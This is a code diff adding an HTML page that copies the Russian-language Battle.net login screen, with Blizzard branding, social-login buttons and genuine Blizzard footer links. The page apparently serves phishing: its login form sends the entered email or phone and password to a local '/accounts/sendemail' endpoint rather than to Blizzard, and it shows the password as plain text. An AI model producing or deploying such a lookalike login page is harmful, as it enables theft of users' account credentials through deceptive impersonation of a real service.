@@ -1,0 +1,86 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <link rel="stylesheet" href="BattleNet/styles/battle.css" />
+    <title></title>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="BattleNet/images/logo.svg" />
+        <h3 id="login-header">Авторизоваться</h3>
+        <div class="authorization_options_1">
+            <form>
+                <button>
+                    <img class="icons" src="BattleNet/images/google.svg" />
+                </button>
+            </form>
+            <form>
+                <button class="blue">
+                    <img class="icons" src="BattleNet/images/facebook.svg" />
+                </button>
+            </form>
+            <form>
+                <button>
+                    <img class="icons" src="BattleNet/images/apple.svg" />
+                </button>
+            </form>
+        </div>
+        <div class="authorization_options_2">
+            <form>
+                <button class="green">
+                    <img class="icons" src="BattleNet/images/xbox.svg" />
+                </button>
+            </form>
+            <form>
+                <button class="blue">
+                    <img class="icons" src="BattleNet/images/ps.svg" />
+                </button>
+            </form>
+            <form>
+                <button class="red">
+                    <img class="icons" src="BattleNet/images/switch.svg" />
+                </button>
+            </form>
+            <form>
+                <button>
+                    <img class="icons" src="BattleNet/images/steam.svg" />
+                </button>
+            </form>
+        </div>
+        <div class="other_authorization_options">
+            <span>или войти через</span>
+        </div>
+        <form action="/accounts/sendemail" method="post">
+            <div class="login_input">
+                <div class="mail_phone">
+                    <input class="inpt_1" placeholder="Электронная почта или телефон" name="login" type="text" />
+                </div>
+                <div class="password">
+                    <input placeholder="Пароль" name="password" type="text" />
+                    <img src="BattleNet/images/eye.png" class="eye" />
+                </div>
+            </div>
+            <button id="btn_log_in" type="submit" class="log_in">Авторизоваться</button>
+        </form>
+        <a class="a_1" href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru%2Ffamily%2Fworld-of-warcraft&theme=bnet-next&app=shop&hostingApp=shop&flowTrackingId=f60946e3-05fd-41fa-b288-a68eeee2dd4a&bdp=12b85b4363672c5d26c5b464f58d6700d75802fa840a3835195105b607287574">Зарегистрируйте учетную запись Battle.net бесплатно</a>
+        <a class="a_2" href="https://account.battle.net/recovery/?ref=&theme=bnet-next&app=shop&hostingApp=shop&flowTrackingId=f60946e3-05fd-41fa-b288-a68eeee2dd4a">Вы не можете войти?</a>
+    </div>
+    <div class="footer_1">
+        <a class="links" href="https://www.blizzard.com/company/legal/eula">ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ BLIZZARD</a>
+        <span class="spn">|</span>
+        <a class="links" href="https://www.blizzard.com/company/about/privacy.html">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</a>
+        <span class="spn">|</span>
+        <a class="links" href="https://www.blizzard.com/company/legal/">УСЛОВИЯ</a>
+        <span class="spn">|</span>
+    </div>
+    <div class="footer_2">
+        <a class="links" href="https://eu.blizzard.com/company/about/infringementnotice.html">АВТОРСКОЕ ПРАВО</a>
+        <span class="spn">|</span>
+        <a class="links" href="https://eu.account.battle.net/login/cookies">ФАЙЛЫ COOKIE</a>
+        <span class="spn">|</span>
+        <a class="links" href="https://eu.account.battle.net/login/cookies#settings">ПАРАМЕТРЫ COOKIE</a>
+    </div>
+    <div class="bottom">© Blizzard Entertainment, Inc., 2023</div>
+</body>
+</html>
